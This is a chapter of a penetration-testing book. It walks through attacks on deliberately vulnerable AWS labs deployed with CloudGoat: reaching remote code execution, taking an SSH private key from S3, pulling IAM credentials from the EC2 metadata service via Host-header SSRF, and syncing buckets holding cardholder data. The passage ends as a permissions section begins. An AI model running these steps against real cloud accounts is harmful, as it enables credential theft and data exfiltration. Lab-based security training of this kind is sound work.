<html><head></head><body>
  <div id="_idContainer350" class="Basic-Text-Frame">
    <h1 class="chapterNumber">8</h1>
    <h1 id="_idParaDest-203" class="chapterTitle">Cloud Security Exploitation</h1>
    <p class="normal">Cloud adoption has significantly changed the way organizations collect, process, and store the data of end users. Some businesses automatically assume that their cloud providers will take care of their cybersecurity, but every cloud consumer, be it an individual or a business, must be aware that it’s a shared responsibility. Having said that, the majority of the time, when testers successfully get access to an internal network, they think they are almost done with the test, assuming they can then proceed to compromise the network or enterprise. </p>
    <p class="normal">In this chapter, we will explore different types of attacks that pentesters can leverage if they gain a foothold into a cloud environment. In particular, we will explore AWS and identify multiple processes for circumventing security controls and demonstrate this using the tools in Kali Linux.</p>
    <p class="normal">By the end of this chapter, you will have learned how to attack misconfigured cloud services by covering the following topics:</p>
    <ul>
      <li class="bulletList">Basic principles of cloud services </li>
      <li class="bulletList">Vulnerability scanning and application exploitation in EC2 instances</li>
      <li class="bulletList">Reaching AWS IAM keys </li>
      <li class="bulletList">Testing for S3 bucket misconfiguration </li>
      <li class="bulletList">Exploiting security permission flaws</li>
      <li class="bulletList">Obfuscating CloudTrail logs</li>
    </ul>
    <p class="normal">We will explore the basic principles of cloud services and different deployment models.</p>
    <h1 id="_idParaDest-204" class="heading-1">Introduction to cloud services</h1>
    <p class="normal">Cloud computing, in general, is the on-demand availability of computing resource services, particularly <a id="_idIndexMarker885"/>storage and computing power for consumers. The main principles of cloud computing are on-demand, self-service broad network access, multi-tenancy, resource pooling, elasticity, scalability, and measured services. <em class="italic">Table 8.1</em> provides details on the four deployment models cloud service providers offer. If any of these deployment models are successfully exploited and communication is established, then it provides persistent access to achieve the objective of the pentest:</p>
    <table id="table001-5" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Deployment Model</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Private Cloud</p>
          </td>
          <td class="table-cell">
            <p class="normal">Cloud infrastructure is exclusive and provisioned only for a specific organization. Similar to traditional data centers but hosted on the cloud.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Community Cloud</p>
          </td>
          <td class="table-cell">
            <p class="normal">This is a cloud infrastructure that is shared between the specific community of consumers from organizations that have a shared interest.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Public Cloud</p>
          </td>
          <td class="table-cell">
            <p class="normal">Cloud infrastructure that is provisioned for the general end user public.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Hybrid Cloud</p>
          </td>
          <td class="table-cell">
            <p class="normal">Cloud infrastructure that combines any two of the above models, usually a combination of private and public cloud, on-premises and private cloud, or on-premises and public cloud. </p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 8.1: Cloud deployment models</p>
    <p class="normal">Before working out what type of testing you might have to perform on any given client environment, it is important to understand the following fundamental cloud service models:</p>
    <table id="table002-2" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Service Model</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Software as a Service</p>
          </td>
          <td class="table-cell">
            <p class="normal">In this service, the cloud vendor provides software to organizations whereby they pay as they go. Some examples of SaaS cloud service providers include Dropbox, G Suite, Microsoft Office 365, Slack, and Citrix Content Collaboration.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Platform as a Service</p>
          </td>
          <td class="table-cell">
            <p class="normal">In this service, the cloud vendor provides both the hardware and software to the organizations. Some examples include AWS Elastic Beanstalk, Heroku, Windows Azure (mostly used as PaaS), Force.com, OpenShift, and Apache Stratos.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Infrastructure as a Service</p>
          </td>
          <td class="table-cell">
            <p class="normal">In this service, mainly storage, networking, and virtualization are provided to organizations, who pay as they go. Examples include AWS EC2, Rackspace, <strong class="keyWord">Google</strong> <strong class="keyWord">Compute Engine</strong> (<strong class="keyWord">GCE</strong>), Digital Ocean, etc.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 8.2: Cloud service models</p>
    <p class="normal"><em class="italic">Figure 8.1</em> depicts how the security responsibility changes based on the service models:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_01.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.1: Cloud service model and responsibilities</p>
    <p class="normal">Having <a id="_idIndexMarker886"/>understood the basics, we will now be setting up our AWS lab to configure deliberately vulnerable instances using the CloudGoat AWS deployment tool that we installed in <em class="chapterRef">Chapter 1</em>, <em class="italic">Goal-Based Penetration Testing</em>. Be aware that usage of AWS services will incur costs, even if CloudGoat is left unused after deploying the vulnerable instances. Additionally, these instances will open up your cloud infrastructure to a variety of attacks. </p>
    <p class="normal">Scenarios on accessing these cloud services would even begin from the initial reconnaissance phase wherein attackers explore all the GitHub repositories, pastebin, or any data dumping sites of a target organization and could potentially obtain the access key and the secret.</p>
    <p class="normal">The following <a id="_idIndexMarker887"/>are the CloudGoat options available to configure and practice AWS-specific attacks. To understand the options, testers can run a Docker image by entering <code class="inlineCode">docker run –it rhinosecuritylabs/Cloudgoat:latest</code> in the terminal, which should lead us to the CloudGoat shell, where we run <code class="inlineCode">./cloudgoat help</code>, which should provide us with the following five options shown in <em class="italic">Figure 8.2</em>: </p>
    <figure class="mediaobject"><img src="../Images/B17765_08_02.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.2: Running CloudGoat from the Docker image</p>
    <div class="note">
      <p class="normal">Testers who receive any error messages relating to Terraform, such as <code class="inlineCode">OSError: [Errno 8] Exec format error: "terraform" or "Terraform not found"</code>, can resolve this issue by following these steps to replace the default Terraform with the latest version: </p>
      <ol class="numberedList" style="list-style-type: decimal;">
        <li class="numberedList" value="1">Run <code class="inlineCode">wget https://releases.hashicorp.com/terraform/1.0.10/terraform_1.0.10_linux_amd64.zip</code></li>
        <li class="numberedList">Unzip <code class="inlineCode">terraform_1.0.10_linux_amd64.zip</code></li>
        <li class="numberedList">Run <code class="inlineCode">mv /usr/bin/terraform terraform_old</code></li>
        <li class="numberedList">Run <code class="inlineCode">mv terraform /usr/bin/</code> </li>
      </ol>
    </div>
    <p class="normal">The following shows details of the first four options:</p>
    <ul>
      <li class="bulletList"><code class="inlineCode">config</code> – This option <a id="_idIndexMarker888"/>allows us to manage different aspects of our CloudGoat installation, especially the IP whitelist and our default AWS profile:<ul>
          <li class="bulletList"><code class="inlineCode">whitelist</code> – It is always recommended that testers whitelist the IP address <a id="_idIndexMarker889"/>that they will be conducting the testing from due to the potentially vulnerable resources that are deployed within the AWS infrastructure. This command stores the IP address or IP address ranges within the <code class="inlineCode">./whitelist.txt</code> file within the base project directory. Additionally, you can add the <code class="inlineCode">–auto</code> argument and this tool will automatically make a network request. Use <code class="inlineCode">curl</code> <code class="inlineCode">ifconfig.co</code> to find your IP address and then create the whitelist file with the result.</li>
          <li class="bulletList"><code class="inlineCode">profile</code> – CloudGoat will <a id="_idIndexMarker890"/>need the AWS profile to be manually configured by default. Running this command will prompt testers to enter profile details such as the AWS access key and secret and they will be stored in the <code class="inlineCode">config.yml</code> file within the project directory. Attackers can choose to create their own <code class="inlineCode">config.yml</code> file.</li>
        </ul>
      </li>
      <li class="bulletList"><code class="inlineCode">create</code> – This option <a id="_idIndexMarker891"/>deploys a scenario to the AWS account. If you deploy a scenario twice, CloudGoat will destroy the existing one and create a new scenario. </li>
      <li class="bulletList"><code class="inlineCode">list</code> – This will <a id="_idIndexMarker892"/>show all the deployed scenarios, undeployed scenarios, and more information about a specific deployed scenario. </li>
      <li class="bulletList"><code class="inlineCode">destroy</code> – This will <a id="_idIndexMarker893"/>shut down and delete all the resources that were created by CloudGoat.</li>
    </ul>
    <p class="normal">To configure <a id="_idIndexMarker894"/>CloudGoat to a specific profile, run <code class="inlineCode">./cloudgoat.py config profile &lt;profilename&gt;</code> in the terminal:</p>
    <pre class="programlisting con"><code class="hljs-con">./cloudgoat config profile masteringkali 
</code></pre>
    <p class="normal">It is very important that we configure the AWS resources as accessible only by the IP that you will be connecting from:</p>
    <pre class="programlisting con"><code class="hljs-con">./cloudgoat.py config whitelist –auto
</code></pre>
    <p class="normal">For our next section, we will deploy a vulnerable web application to perform application-specific exploitation within AWS. This can be achieved by running <code class="inlineCode">./cloudgoat create rce_web_app --profile masteringkali</code>. This should begin the deployment of the cloud resources by CloudGoat to your AWS account and once the deployment is <a id="_idIndexMarker895"/>complete, you should be able to see the confirmation with the cloud access details, as shown in <em class="italic">Figure 8.3</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">./cloudgoat.py create rce_web_app --profile masteringkali
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_08_03.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.3: Deploying rce_web_app using CloudGoat and our AWS profile</p>
    <p class="normal">Once the deployment of the web application and the supporting resources is complete, testers should be presented with <em class="italic">Figure 8.4</em> as successful completion of the deployment:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_04.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.4: Successful deployment of the vulnerable setup</p>
    <p class="normal">Testers can <a id="_idIndexMarker896"/>utilize the access key and secret key generated by CloudGoat to perform the penetration test on the deployed scenario. As a traditional step, testers can utilize vulnerability scanners such as Scout Suite or Prowler. </p>
    <h1 id="_idParaDest-205" class="heading-1">Vulnerability scanning and application exploitation in an EC2 instance </h1>
    <p class="normal">The first <a id="_idIndexMarker897"/>step is to equip our Kali Linux to install <a id="_idIndexMarker898"/>the AWS client by running <code class="inlineCode">sudo apt install awscli</code> from the terminal, and then we can leverage the tools to understand <a id="_idIndexMarker899"/>what permissions we have with the <a id="_idIndexMarker900"/>current API and secret keys.</p>
    <p class="normal">Configure the AWS profile by running <code class="inlineCode">sudo aws configure --profile &lt;profilename&gt;</code> in the terminal.</p>
    <p class="normal">In this case, we will configure the two profiles within our Kali Linux: </p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">For demonstration <a id="_idIndexMarker901"/>purposes, we will change the suggested <code class="inlineCode">Lara</code> profile name (see <em class="italic">Figure 8.4</em>) to <strong class="keyWord">RCE</strong> (<strong class="keyWord">Remote Code Execution</strong>) with the access key and secret key.</li>
      <li class="numberedList">We will create a <code class="inlineCode">mcduck</code> profile as suggested by CloudGoat with the keys generated during the CloudGoat scenario deployment.
        <pre class="programlisting con"><code class="hljs-con">sudo aws configure –-profile &lt;profilename&gt;
</code></pre>
      </li>
    </ol>
    <p class="normal">To confirm that <a id="_idIndexMarker902"/>our profiles are working, we can list down the <strong class="keyWord">S3</strong> (which is Amazon’s <strong class="keyWord">Simple Storage Service</strong>) buckets that these profiles can access by running the following command and testers should be able to see them as in <em class="italic">Figure 8.5</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo aws s3 ls –-profile &lt;profilename&gt;
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_08_05.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.5: Configuring the AWS profile within Kali Linux</p>
    <p class="normal">Attackers <a id="_idIndexMarker903"/>can leverage automated tools such <a id="_idIndexMarker904"/>as Scout Suite and Prowler to understand <a id="_idIndexMarker905"/>misconfigurations/excessive permissions <a id="_idIndexMarker906"/>quickly. </p>
    <p class="normal">Scout Suite is an <a id="_idIndexMarker907"/>open-source cloud security auditing tool that works on multi-cloud environments such as AWS, GCP, and Azure. Additionally, this tool is in the alpha phase for Oracle and Alibaba Cloud. This tool is written in Python and utilizes exposed APIs to gather configuration details to provide the attack surface of a given cloud environment. The project is actively maintained by NCC Group. There is a commercial service to this tool as well. Scout can be installed to Kali Linux by cloning the repository locally and installing the dependencies by running the following commands in the terminal:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
sudo pip3 install –r requirements.txt
sudo ./setup.py install 
sudo scout aws --profile &lt;profilename&gt; 
</code></pre>
    <p class="normal"><em class="italic">Figure 8.6</em> shows the launch of the Scout security auditing tool on AWS using a specific profile.</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_06.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.6: Running Scout on AWS using our profile</p>
    <p class="normal">Once the <a id="_idIndexMarker908"/>scanning is complete, Scout creates an HTML report within the same folder as the tool was run. Testers will be able to list the misconfigurations/vulnerabilities relating to the profile that was scanned. <em class="italic">Figure 8.7</em> depicts the report output:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_07.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.7: Output report of Scout</p>
    <p class="normal">Further <a id="_idIndexMarker909"/>subsections detail AWS features/options and descriptions that will help pentesters understand what they should focus on, as shown in <em class="italic">Figure 8.8</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_08.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.8: Detailed IAM section within the Scout report</p>
    <p class="normal"><strong class="keyWord">Prowler</strong> is another <a id="_idIndexMarker910"/>security tool specifically designed to perform checks on AWS that covers security best practices across all AWS regions and groups. The tool also has a prebuilt mapping to various benchmarks (CIS, GDPR, HIPAA, PCI-DSS, ISO-27001, FFIEC, SOC2, and others). This tool is written in a combination of multiple Bash scripts that perform local checks with the existing privileges of the profile that is configured. This can be installed on Kali Linux by cloning the repository by running the following commands in the terminal:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo git clone https://github.com/toniblyx/prowler
cd prowler
</code></pre>
    <p class="normal">The latest version of Prowler is v2.5.0. Testers can verify the scanning activity by simply running <code class="inlineCode">sudo ./prowler –p &lt;profile name&gt;</code> as shown in <em class="italic">Figure 8.9</em>: </p>
    <figure class="mediaobject"><img src="../Images/B17765_08_09.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 8.9: Running the Prowler cloud security tool from Kali Linux</p>
    <p class="normal">Attackers <a id="_idIndexMarker911"/>can leverage the AWS Command Line Interface cheat sheet at <a href="https://www.bluematador.com/learn/aws-cli-cheatsheet"><span class="url">https://www.bluematador.com/learn/aws-cli-cheatsheet</span></a></p>
    <p class="normal">Let’s go ahead <a id="_idIndexMarker912"/>and identify the list of instances that are available to the profile RCE that we created by running the following command in the terminal: </p>
    <pre class="programlisting con"><code class="hljs-con">sudo aws ec2 describe-instances --profile &lt;Profile Name&gt;
</code></pre>
    <p class="normal">This should provide the instance details as shown in <em class="italic">Figure 8.10</em>, with the public and internal IP details: </p>
    <figure class="mediaobject"><img src="../Images/B17765_08_10.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 8.10: Detailed IAM section within the Scout report</p>
    <p class="normal">In the <a id="_idIndexMarker913"/>details of the instance (the full output is not displayed in <em class="italic">Figure 8.10</em>), we can see that the public IP is configured to specific security groups. If you locate <code class="inlineCode">"RootDeviceType"</code> from the output of the above command it will be pointing to <code class="inlineCode">"ebs"</code>, which means the IP address is not publicly accessible.</p>
    <p class="normal">The next step <a id="_idIndexMarker914"/>is to find out what load balancers are configured to this device by running <code class="inlineCode">sudo aws elbv2 describe-load-balancers –-profile RCE</code> in the Kali Linux terminal: </p>
    <pre class="programlisting con"><code class="hljs-con">sudo aws elbv2 describe-load-balancers --profile &lt;Profile Name&gt;
</code></pre>
    <p class="normal">The output of the EC2 load balancers comes back with the specific DNS name as shown in <em class="italic">Figure 8.11</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_11.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 8.11: Extracting elastic load balancer details</p>
    <p class="normal">Finally, we are <a id="_idIndexMarker915"/>now able to reach the load balancer as shown in <em class="italic">Figure 8.12</em>. The next step is to identify what else is available:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_12.png" alt="A screenshot of a computer  Description automatically generated with medium confidence"/></figure>
    <p class="packt_figref">Figure 8.12: Accessing the elastic load balancer public DNS</p>
    <p class="normal">Next, we will find our profile’s permission within the S3 bucket by running <code class="inlineCode">sudo aws s3 ls –profile RCE</code> in the <a id="_idIndexMarker916"/>terminal. This profile <a id="_idIndexMarker917"/>has access only to the logs folder within the S3 bucket as shown in <em class="italic">Figure 8.13</em>: </p>
    <figure class="mediaobject"><img src="../Images/B17765_08_13.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.13: Accessing the S3 buckets with the RCE profile</p>
    <p class="normal">We explore the <a id="_idIndexMarker918"/>logs folder by listing all the directories <a id="_idIndexMarker919"/>within the S3 bucket by running <code class="inlineCode">sudo aws s3 ls s3://&lt;bucket&gt;/pathofthefile --profile –-region us-east-1</code> and copy the file by running the following command in the terminal as shown in <em class="italic">Figure 8.14</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo aws s3 cp s3://&lt;bucket&gt;/Path to the file&gt;. --profile &lt;Profile Name&gt; --region us-east-1
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_08_14.png" alt="Background pattern  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 8.14: Copying the log file from the S3 bucket</p>
    <p class="normal">Analyzing the <a id="_idIndexMarker920"/>log file, we find there are multiple requests that have <code class="inlineCode">200</code> as the HTTP response from the server and have a unique HTML associated with it, as shown in <em class="italic">Figure 8.15</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_15.png" alt="Background pattern  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 8.15: Analyzing the log file and identifying the URI</p>
    <p class="normal">Finally, accessing the <a id="_idIndexMarker921"/>URL takes us to the form submission, which is vulnerable to remote code execution, whereby testers will now be able to run commands on the server:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_16.png" alt="Graphical user interface, text, application  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 8.16: Successfully executing the command on the server</p>
    <p class="normal">We have <a id="_idIndexMarker922"/>now exploited remote code execution <a id="_idIndexMarker923"/>on the web application by leveraging <a id="_idIndexMarker924"/>the existing permissions to view the <a id="_idIndexMarker925"/>instances, load balancer configuration, and the files that were accessible from the S3 bucket. Let’s try the other profile (<code class="inlineCode">mcduck</code>) to understand how we can further take over the running EC2 instance within the AWS estate. To view instance details testers can run <code class="inlineCode">sudo aws ec2 describe-instances --profile mcduck --region us-east-1</code> as shown in <em class="italic">Figure 8.17</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_17.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.17: Identifying instances using the mcduck profile</p>
    <p class="normal">We can <a id="_idIndexMarker926"/>see the reservations and instance <a id="_idIndexMarker927"/>details with <code class="inlineCode">imageID</code> and its placement. Further <a id="_idIndexMarker928"/>within the details, we can find the <a id="_idIndexMarker929"/>public IP address and the DNS name of the instance along with all the networking and subnet details, as shown in <em class="italic">Figure 8.18</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_18.png" alt=""/> </figure>
    <p class="packt_figref">Figure 8.18: Identifying the public IP and public DNS of the instance</p>
    <p class="normal">Attackers <a id="_idIndexMarker930"/>with the public IP can now explore <a id="_idIndexMarker931"/>any kind of key information that might <a id="_idIndexMarker932"/>be available within the S3 buckets. To view what <a id="_idIndexMarker933"/>S3 buckets are accessible, run <code class="inlineCode">sudo aws s3 ls ––profile ––region us-east-1</code>, and then copy the folder type <code class="inlineCode">sudo aws s3 cp s3://bucket/folder/ ./keys ––profile mcduck ––region us-east-1</code> as shown in <em class="italic">Figure 8.19</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo aws s3 cp s3://&lt;bucket&gt;/&lt;folder&gt;/ .&lt;outputfolder&gt; --profile &lt;Profile Name&gt;
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_08_19.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 8.19: Accessing the S3 profiles using the mcduck profile</p>
    <p class="normal">Now, this <a id="_idIndexMarker934"/>profile only has access to the keystore <a id="_idIndexMarker935"/>and we have copied the public and <a id="_idIndexMarker936"/>private key to our local Kali Linux. The next step <a id="_idIndexMarker937"/>is to change the file permission of the private key by running <code class="inlineCode">sudo chmod 400 cloudgoat</code>, and then secure shell the login to the EC2 instance directly by running <code class="inlineCode">ssh –i cloudgoat ubuntu@PublicIP</code>, as shown in <em class="italic">Figure 8.20</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo chmod 400 privatekey
sudo ssh –i privatekey Ubuntu@publicDNSofEC2
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_08_20.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.20: Logging in to the AWS instance from the acquired private key</p>
    <p class="normal">Now <a id="_idIndexMarker938"/>that we can gain internal access to the Ubuntu <a id="_idIndexMarker939"/>EC2 instance, access the metadata service <a id="_idIndexMarker940"/>by directly accessing <code class="inlineCode">http://169.254.169.254/latest/user-data</code> within <a id="_idIndexMarker941"/>the terminal of the remote system:</p>
    <pre class="programlisting con"><code class="hljs-con">curl http://169.254.169.254/latest/user-data
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_08_21.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.21: Accessing the metadata service within the EC2 instance</p>
    <p class="normal">Attempt to log in to <code class="inlineCode">postgresql</code> with the username and password to identify the secret password:</p>
    <pre class="programlisting con"><code class="hljs-con">psql postgresql://cgadmin:Purplepwny2029@&lt;rds-instance&gt;:5432/cloudgoat
\dt
select * from sensitive_information
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_08_22.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.22: Successfully connecting to the database and accessing the plain text password within the database</p>
    <p class="normal">Within <a id="_idIndexMarker942"/>the EC2 instance, we can now check <a id="_idIndexMarker943"/>what S3 buckets are accessible. Before <a id="_idIndexMarker944"/>you can access the buckets, ensure Ubuntu <a id="_idIndexMarker945"/>is installed with <code class="inlineCode">awscli</code> by running <code class="inlineCode">sudo apt-get install awscli</code> in the terminal and then run the following commands to view the end goal as shown in <em class="italic">Figure 8.23</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo aws s3 ls
sudo aws s3 ls s3://cg-secret-s3-bucket-cgid&lt;uniqueID&gt; --recursive
aws s3 cp s3://cg-secret-s3-bucket-cgidzay5e3vg5r/db.txt . 
cat db.txt
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_08_23.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 8.23: Exfiltrating the database details from the S3 bucket</p>
    <p class="normal">A final <a id="_idIndexMarker946"/>important step is to destroy the setup <a id="_idIndexMarker947"/>by returning to the CloudGoat Docker image <a id="_idIndexMarker948"/>and running <code class="inlineCode">./cloudgoat.py destroy all</code>. You <a id="_idIndexMarker949"/>should get a confirmation as shown in <em class="italic">Figure 8.24</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_24.png" alt="Text  Description automatically generated"/> </figure>
    <p class="packt_figref">Figure 8.24: Destroying the rce_web_app cloud setup using CloudGoat</p>
    <p class="normal">We <a id="_idIndexMarker950"/>have explored the security misconfiguration <a id="_idIndexMarker951"/>and vulnerable web applications <a id="_idIndexMarker952"/>within the AWS setup. We will now <a id="_idIndexMarker953"/>explore the different methodologies that can be leveraged to exploit S3 buckets in the coming section. </p>
    <h1 id="_idParaDest-206" class="heading-1">Testing for S3 bucket misconfiguration</h1>
    <p class="normal">S3 is typically used by organizations to store documents, code, file uploads, and so on and so forth. Typically, a bucket can be either public or private. When public, all users can list the <a id="_idIndexMarker954"/>contents, and when private, only the selected set of users can list the contents. Although S3 exploitation has always been in the news, notably for developers storing mission-critical information in a bucket marked as “public.” In this section, we will explore identifying S3 buckets and exploiting misconfiguration to gain access to the internal AWS infrastructure. </p>
    <p class="normal">To practice S3 bucket misconfiguration, we will be setting up a vulnerable S3 instance using CloudGoat by running the following command within the CloudGoat Docker image: </p>
    <pre class="programlisting con"><code class="hljs-con">./cloudgoat create cloud_breach_s3
</code></pre>
    <p class="normal">Once the setup is complete, testers should be able to see the following message from the deployment tool with the AWS account ID and the target IP address, as shown in <em class="italic">Figure 8.25</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_08_25.png" alt=""/></figure>
    <p class="packt_figref">Figure 8.25: Successful creation of the cloud_breach_s3 AWS environment using CloudGoat</p>
    <p class="normal">Identifying <a id="_idIndexMarker955"/>what is running on the external IP, attackers can choose to run a port scan on the IP. In this case, port <code class="inlineCode">80</code> is open and accessible: </p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Access the IP using the curl utility by running <code class="inlineCode">curl http://&lt;IP Address&gt;</code>. You will receive an error message regarding the EC2 metadata service, as shown in <em class="italic">Figure 8.26</em>:<figure class="mediaobject"><img src="../Images/B17765_08_26.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.26: Accessing the public IP address</p>
      </li>
      <li class="numberedList">Cloud providers certainly do have the ability to manage credentials for resources in any cloud consumers’ cloud-native applications. If this is done correctly, then the storage of credentials in clear text or in a source code repository <a id="_idIndexMarker956"/>can be avoided. In AWS, the <strong class="keyWord">instance metadata service</strong> (<strong class="keyWord">IMDS</strong>) provides the data about a given instance that you can use to configure or manage the running instances. AWS uses the <code class="inlineCode">169.254.169.254</code> IP address to return the hosted metadata service. So, we will be adding the host header to retrieve the contents from the target IP by running <code class="inlineCode">curl http://&lt;IPAddress&gt; -H 'Host:169.254.169.254'</code>, which should return the contents of the root folder of the website as seen in <em class="italic">Figure 8.27</em>. Attackers can choose to use Burp Suite <a id="_idIndexMarker957"/>to intercept the traffic and add a host header to the request and browse the folders and directories.<figure class="mediaobject"><img src="../Images/B17765_08_27.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.27: Successfully accessing the IP with the metadata service</p>
      </li>
      <li class="numberedList">After browsing through the directories, we make a request to the <code class="inlineCode">/latest/meta-data/iam/security-credentials/cg-bank-WAF-Role-cg&lt;ID&gt;</code> file that returns the <code class="inlineCode">AccessKeyID</code>, <code class="inlineCode">secretAccessKey</code>, and session token as shown in <em class="italic">Figure 8.28</em>. The session token indicates that the credentials are time-based. However, if the testers encounter IMDS v2, it will then require an additional token to retrieve the credentials:<figure class="mediaobject"><img src="../Images/B17765_08_28.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.28: Successfully generating the credentials using the AWS metadata service</p>
      </li>
      <li class="numberedList">The next <a id="_idIndexMarker958"/>step is to equip our Kali Linux with the AWS profile from the above information, as shown in <em class="italic">Figure 8.29</em>:
        <pre class="programlisting con"><code class="hljs-con">sudo aws configure -–profile S3exploit
</code></pre>
        <figure class="mediaobject"><img src="../Images/B17765_08_29.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.29: Creating a new profile within Kali Linux for the S3 exploit</p>
      </li>
      <li class="numberedList">Once the profile is configured, we will go ahead and add our session token by editing the AWS credential file. The default location of this file is <code class="inlineCode">~/.aws/credentials</code>. In our case, we have run all the <code class="inlineCode">aws</code> commands using <code class="inlineCode">sudo</code>, hence all the credentials and other details will be stored under the root user. We will be editing the file located in /<code class="inlineCode">root/.aws/credentials</code> by using our favorite editor:
        <pre class="programlisting con"><code class="hljs-con">sudo nano /root/.aws/credentials
</code></pre>
        <p class="normal">Add the <code class="inlineCode">aws_session_token</code> obtained in <em class="italic">step 3</em>, as shown in <em class="italic">Figure 8.30</em>:</p>
        <figure class="mediaobject"><img src="../Images/B17765_08_30.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.30: Adding aws_session_token to the credential file</p>
      </li>
      <li class="numberedList">Now, the <a id="_idIndexMarker959"/>next step is to check if we are able to access the S3 buckets by running the following command in the terminal:
        <pre class="programlisting con"><code class="hljs-con">sudo aws s3 list –-profile S3exploit
</code></pre>
      </li>
      <li class="numberedList">From the previous step, we can now download the contents of the S3 bucket to our local host by running the command shown in <em class="italic">Figure 8.31</em>:
        <pre class="programlisting con"><code class="hljs-con">sudo aws s3 sync s3://&lt;Name of the bucket&gt; ./newfolder –profile S3exploit
</code></pre>
        <figure class="mediaobject"><img src="../Images/B17765_08_31.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.31: Copying the S3 bucket contents to the local system</p>
      </li>
      <li class="numberedList">We have now exploited the misconfigured S3 bucket and exfiltrated the data from the target organization. You should now be able to view the cardholder <a id="_idIndexMarker960"/>data with all the <strong class="keyWord">personally identifiable information</strong> (<strong class="keyWord">PII</strong>) as shown in <em class="italic">Figure 8.32</em>:<figure class="mediaobject"><img src="../Images/B17765_08_32.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.32: Contents of the copied data that includes personally identifiable information</p>
      </li>
      <li class="numberedList">The final <a id="_idIndexMarker961"/>step is to go back to the CloudGoat Docker image and ensure that we destroy the instance created to avoid any accidental exposure to real attackers or billing charges from Amazon by running the following command within the Docker image:
        <pre class="programlisting con"><code class="hljs-con">./cloudgoat destroy cloud_breach_s3
</code></pre>
      </li>
    </ol>
    <p class="normal">Understanding misconfiguration in S3 could lead to data exfiltration. How about if there is a misconfiguration in the permissions that are set for users? We will explore that in the next section. </p>
    <h1 id="_idParaDest-207" class="heading-1">Exploiting security permission flaws</h1>
    <p class="normal">The <a id="_idIndexMarker962"/>following are the most common vulnerabilities within AWS cloud services:</p>
    <ul>
